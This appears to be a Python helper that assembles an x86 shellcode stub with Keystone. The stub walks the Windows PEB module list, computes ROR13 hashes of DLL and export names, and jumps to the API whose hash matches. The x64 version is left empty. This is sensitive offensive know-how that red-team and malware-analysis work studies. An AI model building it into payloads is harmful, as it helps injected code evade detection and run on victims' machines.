
from keystone import *

class get_api_shellcode(object):
    def __init__(self) -> None:
        self.asm_x86 = '''
                cld
                call main_code
                pushad
                xor ebx, ebx
                mov ebp, esp
                mov ebx, fs:[30h]                   ;PEB     
                mov ebx, [ebx+0Ch]                  ;PEB->Ldr    
                mov ebx, [ebx+14h]                  ;(LDR_DATA_TABLE_ENTRY*)PEB->Ldr.InMemoryOrderList

            next_module:
                movzx ecx, word ptr[ebx+26h]        ;(UNICODE_STRING) BaseDllName.MaxLength
                xor edi, edi
                mov esi, [ebx+28h]                  ;(UNICODE_STRING) BaseDllName.Buffer  

            next_mod_char:
                xor eax, eax
                lodsb
                cmp al, 61h                         ;Check if Upper     
                jl hash_upper
                sub al, 20h                         ;To Upper

            hash_upper:
                ror edi, 0Dh                        ;Start ROR13 Hash
                add edi, eax                        ;Computation for Dll Name 
                loop next_mod_char
                push ebx
                push edi
                mov ebx, [ebx+10h]                  ;(LDR_DATA_TABLE_ENTRY*)DllBaseAddress
                mov eax, [ebx+3Ch]                  ;IMAGE_DOS_HEADER.e_lfanew
                add eax, ebx                        ;IMAGE_NT_HEADERS32
                mov eax, [eax+78h]                  ;Export Address Table RVA
                test eax, eax
                jz fetch_nxt_mod
                add eax, ebx                        ;Export Address Table VA
                push eax
                mov ecx, [eax+18h]                  ;EAT->NumberOfNames
                mov edx, [eax+20h]                  ;EAT->AddressOfName
                add edx, ebx

            next_api:
                test ecx, ecx
                jz fetch_nxt_mod2
                dec ecx
                mov esi, [edx+ecx*4]                ;Next API Name
                xor edi, edi
                add esi, ebx

            next_api_char:    
                xor eax, eax
                lodsb                               ;Start ROR13 Hash
                ror edi, 0Dh                        ;Computation for API 
                add edi, eax
                cmp al, ah                          ;Check if end of string
                jnz next_api_char
                add edi, [ebp-8]                    ;Add DLLName ROR13 Hash
                cmp edi, [ebp+24h]                  ;Check if matched with target API Hash 
                jnz next_api
                pop eax
                mov edx, [eax+24h]                  ;EAT->AddressOfNameOrdinals
                add edx, ebx
                mov cx, word ptr[edx+ecx*2]         ;Get Ordinal
                mov edx, [eax+1Ch]                  ;EAT->AddressOfFunctions
                add edx, ebx
                mov edx, [edx+ecx*4]                ;Get RVA of Function by Ordinal
                add edx, ebx                    
                mov eax, edx
                mov [esp+24h], eax                  ;EAX->Start VA of Target API
                pop edx
                pop edx
                popad
                pop ecx
                pop ebx
                push ecx
                jmp eax                             ;Jump to API Procedure
            fetch_nxt_mod2:
                pop eax

            fetch_nxt_mod:
                pop edi
                pop ebx
                mov ebx, [ebx]
                jmp next_module

            main_code:
        '''

        self.asm_x64 = '''
        '''


    def assemble(self, arch="x86"):
        asm = None
        ks = None
        if arch.upper() == "X86":
            asm = self.asm_x86
            ks = Ks(KS_ARCH_X86, KS_MODE_32)
        elif arch.upper() == "X64":
            asm = self.asm_x64
            ks = Ks(KS_ARCH_X86, KS_MODE_64)

        # Remove asm code comments before assembling
        asm = asm.split("\n")
        get_api_enc = bytes()
        cnt = 0
        o = []
        for d in asm:
            if len(d) <= 0:
                continue
            s = d.find(";")
            if s < 0:
                s=0
                o.append(d[s:])
            else:
                o.append(d.replace(d[s:], ""))
        
        # Assemble
        asm = "\n".join(o)
        get_api_enc, cnt = ks.asm(asm)
        return bytes(get_api_enc), cnt